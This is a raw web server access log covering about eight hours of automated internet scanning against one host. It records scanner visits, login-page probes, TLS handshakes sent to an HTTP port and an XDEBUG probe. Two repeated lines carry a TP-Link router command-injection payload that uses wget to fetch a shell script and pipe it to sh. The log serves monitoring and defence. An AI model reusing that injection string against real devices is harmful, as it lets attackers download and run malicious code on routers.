20.102.97.100 - - [17/Dec/2025:23:34:38 +0700] "MGLNDD_13.214.39.19_80" 400 157 "-" "-"
93.174.93.12 - - [17/Dec/2025:23:52:50 +0700] "GET / HTTP/1.0" 200 615 "-" "Mozilla/5.0 (Linux; Android 8.1.0; Moto G (5S) Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
45.194.92.18 - - [18/Dec/2025:00:07:46 +0700] "GET /cgi-bin/webproc HTTP/1.0" 404 153 "http://13.214.39.19:80/cgi-bin/webproc" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
101.32.218.31 - - [18/Dec/2025:00:10:12 +0700] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
43.167.241.46 - - [18/Dec/2025:00:20:00 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
167.94.138.205 - - [18/Dec/2025:00:27:59 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.205 - - [18/Dec/2025:00:28:00 +0700] "PRI * HTTP/2.0" 400 157 "-" "-"
167.94.138.205 - - [18/Dec/2025:00:28:00 +0700] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x036=a\x89\x82\xD5\x05\xE6\xC1!\xE5Hl\xAC\xC3\x8D\xA5u\xD5\x16\xC7\xF9\x91\xFF\xAB\x08@\x9B\x88\xD3\x0C\x1D {\x12\xB5\xAF\xD6/\x00e\xFF\xD1 \x5C\x5C\xD4\xE5d\xCF\xE4,\x14A\xAETmIug\x93S\xBC\xC9q\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
167.94.138.205 - - [18/Dec/2025:00:28:00 +0700] "GET /favicon.ico HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.205 - - [18/Dec/2025:00:28:04 +0700] "GET /login HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.205 - - [18/Dec/2025:00:28:09 +0700] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x035,{/\xCC\x17\xB0F8_8\xF8\x9CE.\xBD\xF8Z\x1B{{\x196A\xA4\xAFp*Ss\x19\x00 \x8Dq\xB0\xD1\xCD\xA9\xF9\x9E\xAF/\xF8X\xA4lc\xD4\xD8l\x06\x5CG=K\xE3W\xD5)\xB9\x84\xE4\xDCb\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
35.233.95.0 - - [18/Dec/2025:01:17:22 +0700] "GET / HTTP/1.1" 200 615 "-" "python-requests/2.32.5"
101.32.218.31 - - [18/Dec/2025:01:50:56 +0700] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
43.156.156.96 - - [18/Dec/2025:02:13:31 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
195.184.76.35 - - [18/Dec/2025:03:13:19 +0700] "\x16\x03\x03\x01\xA5\x01\x00\x01\xA1\x03\x03\x0Cj8\x16=\xDF\x09\xDA-\x9C\x83\xFB\xC9,\x01\xB6G_\x03\xA4s\xE0;\x83\xD1\x9F\x1E\xD4\xBFa6\xF9 \xBCz\xF1o\x9FC}A\xD3\xC1\xF7\xD1\x88\xEC\xA7\xAE\xF2$\xAB\xAC\x7F3\xA9f#\xD4\x1D,\xFE!\xD3\x7F\x00\x8A\x00\x16\x003\x00g\xC0\x9E\xC0\xA2\x00\x9E\x009\x00k\xC0\x9F\xC0\xA3\x00\x9F\x00E\x00\xBE\x00\x88\x00\xC4\x00\x9A\xC0\x08\xC0\x09\xC0#\xC0\xAC\xC0\xAE\xC0+\xC0" 400 157 "-" "-"
195.184.76.35 - - [18/Dec/2025:03:13:22 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
195.184.76.205 - - [18/Dec/2025:03:15:08 +0700] "GET /favicon.ico HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
101.32.218.31 - - [18/Dec/2025:03:30:56 +0700] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
91.224.92.121 - - [18/Dec/2025:04:17:45 +0700] "OPTIONS / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36"
20.14.90.84 - - [18/Dec/2025:04:30:47 +0700] "GET /portal/redlion HTTP/1.1" 404 153 "-" "Mozilla/5.0 zgrab/0.x"
172.104.11.4 - - [18/Dec/2025:04:45:38 +0700] "\x16\x03\x01\x01" 400 157 "-" "-"
172.104.11.4 - - [18/Dec/2025:04:45:39 +0700] "\x16\x03\x01\x01" 400 157 "-" "-"
101.32.218.31 - - [18/Dec/2025:05:11:26 +0700] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
162.216.150.34 - - [18/Dec/2025:05:44:03 +0700] "GET / HTTP/1.1" 200 615 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
221.159.119.6 - - [18/Dec/2025:06:30:00 +0700] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh) HTTP/1.1" 404 153 "-" "-"
221.159.119.6 - - [18/Dec/2025:06:30:00 +0700] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh) HTTP/1.1" 404 153 "-" "-"
79.124.40.174 - - [18/Dec/2025:06:49:34 +0700] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
101.32.218.31 - - [18/Dec/2025:06:51:23 +0700] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
91.232.238.106 - - [18/Dec/2025:06:57:28 +0700] "GET /robots.txt HTTP/1.0" 404 153 "-" "xfa1"
203.234.179.129 - - [18/Dec/2025:07:12:00 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
